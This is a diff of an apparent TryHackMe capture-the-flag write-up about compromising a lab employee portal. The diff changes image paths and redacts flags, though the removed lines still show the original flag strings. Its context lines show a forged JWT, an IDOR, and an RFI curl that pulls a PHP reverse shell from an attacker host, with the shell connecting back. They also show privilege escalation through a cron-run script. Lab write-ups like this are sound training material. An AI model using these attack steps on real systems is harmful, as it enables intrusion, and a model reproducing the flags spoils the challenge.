@@ -92,14 +92,14 @@ Only two ports.
 - SSH was never a usable entry point this session: we never obtained a credential we could present to it directly (more on that later, since one of our later findings _suggests_ SSH might work without us ever proving it).
 - That leaves the web application as the entire attack surface, so everything from here on is about that one PHP/Apache app.
 
-![NexusCorp Employee Portal login page](images/login.png)
+![NexusCorp Employee Portal login page](../../investigations/TryHackMe/domino/evidence/images/login.png)
 
 The login page itself gave us two things worth noting:
 
 1. The username placeholder (`firstname.lastname`) told us the account-naming convention.
 2. A footer link to "Our Team" told us where to go find real names to plug into that convention.
 
-![NexusCorp "Our Team" page listing all 7 employees](images/our-team-page.png)
+![NexusCorp "Our Team" page listing all 7 employees](../../investigations/TryHackMe/domino/evidence/images/our-team-page.png)
 
 That page handed us 7 `full names`, `roles`, `departments`, and `email addresses`, which, combined with the naming convention from the login page, gave us seven concrete usernames to work with:
 
@@ -160,7 +160,7 @@ This gave us our first authenticated foothold: low-privilege, `role: user`, with
 
 Logged in as `emma.taylor`, we walked the dashboard by hand before touching any API directly.
 
-![Dashboard after logging in as emma.taylor](images/emma-taylor-dashboard.png)
+![Dashboard after logging in as emma.taylor](../../investigations/TryHackMe/domino/evidence/images/emma-taylor-dashboard.png)
 
 The dashboard exposed:
 
@@ -171,8 +171,8 @@ The dashboard exposed:
 
 "Secure file API" is the kind of phrase that invites scrutiny, so that's where we went next.
 
-![Support Tickets page](images/support-tickets.png)
-![Open Ticket page](images/open-ticket.png)
+![Support Tickets page](../../investigations/TryHackMe/domino/evidence/images/support-tickets.png)
+![Open Ticket page](../../investigations/TryHackMe/domino/evidence/images/open-ticket.png)
 
 ## Investigation: Breaking the JWT
 
@@ -461,8 +461,8 @@ $ curl -s http://10.49.184.182/dashboard.php -H "Cookie: nexus_session=eyJ1c2VyX
 <a href="/admin/index.php">Admin</a>
 ```
 
-![Forged nexus_session cookie accepted by dashboard.php, inspected via browser DevTools](images/admin-dashboard.png)
-![Administration Console at /admin/index.php, logged in as laura.hayes](images/admin-console.png)
+![Forged nexus_session cookie accepted by dashboard.php, inspected via browser DevTools](../../investigations/TryHackMe/domino/evidence/images/admin-dashboard.png)
+![Administration Console at /admin/index.php, logged in as laura.hayes](../../investigations/TryHackMe/domino/evidence/images/admin-console.png)
 
 Full impersonation of the organization's CISO, no password or MFA required. This whole chain (a disabled signature check two findings back) is what made every downstream step possible, which is worth sitting with: one line of commented-out verification code is the actual root cause behind source disclosure, secret leakage, _and_ admin impersonation.
 
@@ -475,9 +475,11 @@ GET /api/users/profile.php?id=1
 (session: robert.wilson, role: user, plain password login, no forged cookie/JWT)
 ```
 
-![/api/users/profile.php?id=1 returning laura.hayes's full record](images/admin-profile.png)
+![/api/users/profile.php?id=1 returning laura.hayes's full record](../../investigations/TryHackMe/domino/evidence/images/admin-profile.png)
 
-It returned Laura Hayes's complete record, including a `notes` field that isn't even shown to her in her own UI, containing `THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}`.
+_(Note: the flag text in the `notes` field is redacted in this writeup, but is visible in-frame in the screenshot above, which was captured before redaction was part of this workflow.)_
+
+It returned Laura Hayes's complete record, including a `notes` field that isn't even shown to her in her own UI, containing `THM{[REDACTED]}`.
 
 No role check, no ownership check, nothing. Any authenticated user, regardless of privilege, can read any other user's full profile by guessing an ID.
 
@@ -551,7 +553,7 @@ curl -s "http://10.49.184.182/api/files.php?name=http://10.48.122.251:8000/php-r
   -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzkzMTExNjIwLCJleHAiOjE3OTMxMTUyMjB9.2AAq07/tbAhLshTj6yyHO8Wx9E5kH9VxOC5LHfq8YNc"
 ```
 
-![Listener and file server set up before the retry](images/reverse-shell-setup.png)
+![Listener and file server set up before the retry](../../investigations/TryHackMe/domino/evidence/images/reverse-shell-setup.png)
 
 ```bash
 connect to [10.48.122.251] from (UNKNOWN) [10.49.184.182] 39894
@@ -579,7 +581,7 @@ flag3.txt
 monitoring
 tools
 $ cat flag3.txt
-THM{rf1_2_rc3_f00th0ld_fl4g3}
+THM{[REDACTED]}
 ```
 
 `admin_bot.py`, `monitoring/`, and `tools/` (which turned out to hold `pspy64`) are all things we come back to later in this writeup.
@@ -728,7 +730,7 @@ cd devops
 ls
 user.txt
 cat user.txt
-THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}
+THM{[REDACTED]}
 ```
 
 We got in via `su` from the existing web shell, not a direct SSH login, but the flag's own name (`s5h_cr3d_r3u53`) implies this credential might work over actual SSH too, given port `22` was open from the very start.
@@ -966,20 +968,20 @@ root@tryhackme-2404:~# pwd
 root@tryhackme-2404:~# ls
 root.txt  snap
 root@tryhackme-2404:~# cat root.txt
-THM{pr1v3sc_cr0n_r00t_fl4g5}
+THM{[REDACTED]}
 ```
 
 `uid=0(root)`, confirmed three separate ways (`id`, `whoami`, `pwd`), and the flag read straight out of `/root/root.txt`. That closes the full chain: `www-data` → `devops` → `root`, via `health_report.sh`'s cron-triggered execution.
 
 ## Flags Captured
 
-| #    | Flag                                  | How we got it                                                                                                                                           |
-| ---- | ------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| 1    | `THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}`   | `notes` field on `/api/users/profile.php?id=1`, via the IDOR, as a plain low-privilege session                                                          |
-| 2    | `THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}` | Source of `admin/index.php`, read through the LFI chain with a forged admin JWT                                                                         |
-| 3    | `THM{rf1_2_rc3_f00th0ld_fl4g3}`       | `/opt/flag3.txt`, read immediately after landing a shell via the RFI → RCE chain                                                                        |
-| 4    | `THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}`   | `/home/devops/user.txt`, after `su devops` using the reused database password                                                                           |
-| root | `THM{pr1v3sc_cr0n_r00t_fl4g5}`        | `/root/root.txt`, after a reverse shell appended to `health_report.sh` fired via its root crontab trigger, caught with a Penelope listener on port 4445 |
+| #    | Flag              | How we got it                                                                                                                                           |
+| ---- | ----------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| 1    | `THM{[REDACTED]}` | `notes` field on `/api/users/profile.php?id=1`, via the IDOR, as a plain low-privilege session                                                          |
+| 2    | `THM{[REDACTED]}` | Source of `admin/index.php`, read through the LFI chain with a forged admin JWT                                                                         |
+| 3    | `THM{[REDACTED]}` | `/opt/flag3.txt`, read immediately after landing a shell via the RFI → RCE chain                                                                        |
+| 4    | `THM{[REDACTED]}` | `/home/devops/user.txt`, after `su devops` using the reused database password                                                                           |
+| root | `THM{[REDACTED]}` | `/root/root.txt`, after a reverse shell appended to `health_report.sh` fired via its root crontab trigger, caught with a Penelope listener on port 4445 |
 
 ## Lessons Learned
 
